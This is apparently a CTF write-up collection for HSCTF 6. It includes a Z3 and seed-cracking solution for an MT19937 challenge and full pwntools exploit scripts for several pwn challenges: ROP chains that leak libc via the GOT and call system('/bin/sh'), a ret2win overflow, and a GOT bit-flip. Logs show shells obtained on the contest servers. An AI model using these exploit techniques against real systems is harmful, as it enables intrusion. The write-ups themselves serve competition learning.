# HSCTF 6

A bunch of write-ups for HSCTF 6 which I participated in this year. The write-ups are mostly for binary exploitation and reverse engineering. The first few web challenges were pretty easy so I didn't bother doing write-ups.

## Challenges

|Challenge|Type|Points|Solves|
|---------|----|------|------|
|[English Sucks](#english-sucks)|misc|497pts|8|
|[bit](#bit)|pwn|401pts|76|
|[combo-chain](#combo-chain)|pwn|368pts|102|
|[combo-chain-lite](#combo-chain-lite)|pwn|...|...|
|[storytime](#storytime)|pwn|...|...|
|[return-to-sender](#return-to-sender)|pwn|...|...|

# English Sucks

The program displays 216 lines of 'random strings' using the MT19937 (Mersenne Twister) pseudo-random number generator.

We can use Z3 to solve which random values were used to generate the first line of output. Ideally, we want only 1 possible solution as our output from Z3, so that's what the `get.py` is doing.

The `get.cpp` program is responsible for syncing up with the server's PRNG after `untwister` has found the seed. `untwister` found the seed in roughly ~56 minutes, at this point it was just a matter of entering the seed into the `get.cpp` application and finding the required input string to get the flag.

```
$ nc misc.hsctf.com 9988
English sucks!
I just noticed the other day that the letters
B, C, D, G, P, T, V, and Z all rhyme with E
(Z = zee in USA)
My hearing is bad, and sometimes I have trouble
identifying some of the letters.
Can you help me understand what letter is being said?
Here, I'll give you some sample answers:
GDVGTCBGTVTCDZGTGTVCZGDTVPPBZPPG
DGDBTZCZBVDGDCBCZTDDDGCVVPBPBZPB
DPZCGDZTTGVBDCGBPTDDPVBCZZCZZDZD
CVPZDVZZPPVCBBZZBCTPPCDCCTBGPZDD
(truncated 212 lines)
Okay, now tell me what letters are being said.
```

```python
#!/usr/bin/python2

from pwn import *
from z3 import *

#
# $ python get.py
# [+] Opening connection to misc.hsctf.com on port 9988: Done
# [266710019, 724641616, 907273240]
# [*] Switching to interactive mode
# $ CVDCVTDCPZVCPTGCBPZDBVVCDTVZGGG
# You Win!
# hsctf{y0u_kn0w_1_h4d_t0_d0_1t_t0_3m_rng_god}
#
#
# $ ./untwister -d 3 -i ../output -r mt19937 && espeak "I finished with the cracking"
# [*] Depth set to: 3
# [!] Not enough observed values to perform state inference, try again with more than 624 values.
# [*] Looking for seed using mt19937
# [*] Spawning 4 worker thread(s) ...
# [*] Completed in 3843 second(s)
# [$] Found seed 1001671648 with a confidence of 100.00%
#
# $ ./get
# 1001671648
# CVDCVTDCPZVCPTGCBPZDBVVCDTVZGGG
#

p = remote('misc.hsctf.com', 9988)
p.recvuntil('answers:\n')

response = p.recvuntil('Okay')
lines = response[:-5].split('\n')

#
# z3
#

line_count = 0
numbers = []
possibilities = 0

string = 'BCDGPTVZ'
indices = []
for ch in lines[0]:
    indices.append(string.index(ch))

v1, v2, v3 = BitVecs('v1 v2 v3', 32)

s = Solver()
s.add((v2 >> 0x1F & 0x1 | v3 >> 0x0 & 0x3) == indices[0])
s.add((v1 >> 0x09 & 0x7) == indices[1])
s.add((v3 >> 0x05 & 0x7) == indices[2])
s.add((v3 >> 0x08 & 0x7) == indices[3])
s.add((v1 >> 0x15 & 0x7) == indices[4])
s.add((v1 >> 0x06 & 0x7) == indices[5])
s.add((v3 >> 0x1D & 0x7) == indices[6])
s.add((v1 >> 0x1B & 0x7) == indices[7])
s.add((v2 >> 0x04 & 0x7) == indices[8])
s.add((v2 >> 0x0D & 0x7) == indices[9])
s.add((v2 >> 0x0A & 0x7) == indices[10])
s.add((v3 >> 0x1A & 0x7) == indices[11])
s.add((v2 >> 0x16 & 0x7) == indices[12])
s.add((v3 >> 0x17 & 0x7) == indices[13])
s.add((v2 >> 0x1C & 0x7) == indices[14])
s.add((v3 >> 0x14 & 0x7) == indices[15])
s.add((v2 >> 0x01 & 0x7) == indices[16])
s.add((v3 >> 0x11 & 0x7) == indices[17])
s.add((v1 >> 0x00 & 0x7) == indices[18])
s.add((v2 >> 0x13 & 0x7) == indices[19])
s.add((v1 >> 0x18 & 0x7) == indices[20])
s.add((v3 >> 0x0B & 0x7) == indices[21])
s.add((v2 >> 0x19 & 0x7) == indices[22])
s.add((v2 >> 0x10 & 0x7) == indices[23])
s.add((v1 >> 0x03 & 0x7) == indices[24])
s.add((v1 >> 0x12 & 0x7) == indices[25])
s.add((v1 >> 0x0F & 0x7) == indices[26])
s.add((v3 >> 0x02 & 0x7) == indices[27])
s.add((v1 >> 0x0C & 0x7) == indices[28])
s.add((v2 >> 0x07 & 0x7) == indices[29])
s.add((v3 >> 0x0E & 0x7) == indices[30])
s.add((v1 >> 0x1E & 0x3 | v2 >> 0x00 & 0x1) == indices[31])

#
while s.check() == sat:
    model = s.model()
    s.add(Or(v1 != model[v1], v2 != model[v2], v3 != model[v3]))

    if possibilities == 0:
        numbers.append(model[v1])
        numbers.append(model[v2])
        numbers.append(model[v3])

    possibilities += 1

if line_count == 0 and possibilities == 1:
    print numbers

p.recvuntil('said')

if possibilities == 1:
    p.interactive()

p.close()
```

```c
// get.cpp
#include <fstream>
#include <iostream>
#include <random>

int main()
{
    int seed = 0;
    std::cin >> seed;
    std::mt19937 random{seed};
    std::ios::sync_with_stdio(false);

    for (auto i = 216; i--;) {
        auto v1 = random();
        auto v2 = random();
        auto v3 = random();
    }

    decltype(' ') s;

    auto v1 = random();
    auto v2 = random();
    auto v3 = random();

    std::cout << "BCDGPTVZ"[v1 >> 0x1E & 0x3 | v2 >> 0x00 & 0x1];
    std::cout << "BCDGPTVZ"[v1 >> 0x09 & 0x7];
    std::cout << "BCDGPTVZ"[v3 >> 0x05 & 0x7];
    std::cout << "BCDGPTVZ"[v3 >> 0x08 & 0x7];
    std::cout << "BCDGPTVZ"[v1 >> 0x15 & 0x7];
    std::cout << "BCDGPTVZ"[v1 >> 0x06 & 0x7];
    std::cout << "BCDGPTVZ"[v3 >> 0x1D & 0x7];
    std::cout << "BCDGPTVZ"[v1 >> 0x1B & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x04 & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x0D & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x0A & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x16 & 0x7];
    std::cout << "BCDGPTVZ"[v3 >> 0x1A & 0x7];
    std::cout << "BCDGPTVZ"[v3 >> 0x17 & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x1C & 0x7];
    std::cout << "BCDGPTVZ"[v3 >> 0x14 & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x01 & 0x7];
    std::cout << "BCDGPTVZ"[v1 >> 0x00 & 0x7];
    std::cout << "BCDGPTVZ"[v3 >> 0x11 & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x13 & 0x7];
    std::cout << "BCDGPTVZ"[v1 >> 0x18 & 0x7];
    std::cout << "BCDGPTVZ"[v3 >> 0x0B & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x19 & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x10 & 0x7];
    std::cout << "BCDGPTVZ"[v1 >> 0x03 & 0x7];
    std::cout << "BCDGPTVZ"[v1 >> 0x12 & 0x7];
    std::cout << "BCDGPTVZ"[v1 >> 0x0F & 0x7];
    std::cout << "BCDGPTVZ"[v1 >> 0x0C & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x07 & 0x7];
    std::cout << "BCDGPTVZ"[v3 >> 0x0E & 0x7];
    std::cout << "BCDGPTVZ"[v2 >> 0x1F & 0x1 | v3 >> 0x0 & 0x3];

    return 0;
}
```

## combo-chain

The vulnerability is triggered by a buffer overflow in the call to `gets()` inside `vuln()`. The `/bin/sh` string is leaked in the call to `printf()`.

To exploit, the address of `printf` is leaked in libc via the global offset table using a call to `printf` itself. We load `%rdi` with the GOT entry for `printf`. `printf` will only print the first 5 bytes of `&printf` in libc as it contains `0x00` for the last 8-bits, e.g. `0x7f3722eec800`

Using the address of `printf`, we calculate the offset to `system`. The `/bin/sh` string leaked by the call to `printf` in `vuln` is used to land us in a shell.

```python
#!/usr/bin/python2

#
# $ python get.py 
# [+] Opening connection to pwn.hsctf.com on port 2345: Done
# [*] printf @ 0x7fc3176f0800
# [*] Switching to interactive mode
# Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!:
# $ cat flag
# hsctf{i_thought_konami_code_would_work_here}
#

from pwn import *

# p = process('./combo-chain')
p = remote('pwn.hsctf.com', 2345)
p.recvuntil('COMBO CARNAGE!: ')

payload = 'A' * 16
payload += p64(0x4011a4)  # main()
payload += p64(0x401263)  # pop rdi; ret;
payload += p64(0x404029)  # &(printf@got.plt) + 0x1
payload += p64(0x401050)  # vuln+37
payload += p64(0x401166)  # vuln()

p.sendline(payload + '\n')
p.recvuntil('COMBO CARNAGE!: ')

printf = p.recv(5)
printf_address = u64('\x00' + printf + '\x00\x00')
log.info('printf @ {}'.format(hex(printf_address)))

payload = 'B' * 16
payload += p64(0x401263)  # pop rdi; ret;
payload += p64(0x402031)  # "/bin/sh"
payload += p64(printf_address - 0x10470)  # system()

p.sendline(payload + '\n')
p.interactive()
p.close()
```

## combo-chain-lite

```python
#!/usr/bin/python2

#
# $ python get.py
# [+] Opening connection to pwn.hsctf.com on port 3131: Done
# [*] system: 0x7f01a1c16390
#
# Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!:
# [*] Switching to interactive mode
# $ cat flag
# hsctf{wheeeeeee_that_was_fun}
#

from pwn import *

# p = process('./combo-chain-lite')
p = remote('pwn.hsctf.com', 3131)

p.recvuntil('computer: ')
system = int(p.recv(14), 16)

log.info('system: {}'.format(hex(system)))

payload = '//bin/sh##AAAAAA'
payload += p64(0x00401273)
payload += p64(0x00402051)
payload += p64(system)

print p.recvuntil('COMBO CARNAGE!: ')

p.sendline(payload)
p.interactive()
p.close()
```

## bit

We want to overwrite the global offset table entry for `exit` with the address of `flag`.

```
>>> x/wx 0x804a01c
0x804a01c <exit@got.plt>:	0x080484f6

$ nc pwn.hsctf.com 4444
Welcome to the bit.

No nonsense, just pwn this binary. You have 4 tries. Live up to kmh's expectations, and get the flag.

Give me the address of the byte: 0804a01c
Give me the index of the bit: 4
Took care of 0804a01c at offset 4 for ya.

Here's your new byte: 80484e6
Give me the address of the byte: 0804a01c
Give me the index of the bit: 6
Took care of 0804a01c at offset 6 for ya.

Here's your new byte: 80484a6
Give me the address of the byte: 0804a01d
Give me the index of the bit: 1
Took care of 0804a01d at offset 1 for ya.

Here's your new byte: 70080486
Give me the address of the byte: 0804a020
Give me the index of the bit: 1
Took care of 0804a020 at offset 1 for ya.

Here's your new byte: f7e0df72
Well, at least you tried.
[🛐] pwn gods like you deserve this: hsctf{flippin_pwn_g0d}
```

## storytime

```python
#!/usr/bin/python2

#
# $ ./find write 2b0
# ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
# $ ./dump libc6_2.23-0ubuntu10_amd64
# offset___libc_start_main_ret = 0x20830
# offset_system = 0x0000000000045390
# offset_dup2 = 0x00000000000f7970
# offset_read = 0x00000000000f7250
# offset_write = 0x00000000000f72b0
# offset_str_bin_sh = 0x18cd57
#
# $ python get.py
# [+] Opening connection to pwn.hsctf.com on port 3333: Done
# [*] write @ 0x7fc42eb6c2b0
# [*] Switching to interactive mode
# $ ls
# bin
# dev
# flag
# lib
# lib32
# lib64
# storytime
# $ cat flag
# hsctf{th4nk7_f0r_th3_g00d_st0ry_yay-314879357}
#

from pwn import *

p = remote('pwn.hsctf.com', 3333)

p.recvuntil('story: \n')

# The first stage is leaking the address of write in libc.
payload = 'A' * 56
payload += p64(0x00400703)  # pop rdi; ret;
payload += p64(0x1)         # rdi = 0x1
payload += p64(0x00400701)  # pop rsi; pop r15; ret;
payload += p64(0x00601018)  # rsi = write@got.plt
payload += p64(0x00000000)  # r15 = 0x0
payload += p64(0x4004a0)    # call write(rdi, rsi, rdx)
payload += p64(0x40062e)    # main()

p.sendline(payload)

write = u64(p.recv(8))
log.info('write @ {}'.format(hex(write)))

p.recvuntil('story: \n')

payload = 'A' * 56
payload += p64(0x00400703)      # pop rdi; ret;
payload += p64(write + 0x95aa7) # rsi = &"/bin/sh"
payload += p64(write - 0xb1f20) # system(rsi)

p.sendline(payload)
p.interactive()
p.close()
```

## return-to-sender

```python
#!/usr/bin/python2

from pwn import *

#
# $ python get.py
# [+] Opening connection to pwn.hsctf.com on port 1234: Done
# [*] Switching to interactive mode
# Where are you sending your mail to today? Alright, to AAAAAAAAAAAAAAAABBBB\xb6\x91\x0 it goes!
# $ cat flag
# hsctf{fedex_dont_fail_me_now}
# $

#p = process('./return-to-sender')
p = remote('pwn.hsctf.com', 1234)

p.sendline('A' * 16 + 'B' * 4 + p32(0x080491b6))
p.interactive()
p.close()
```
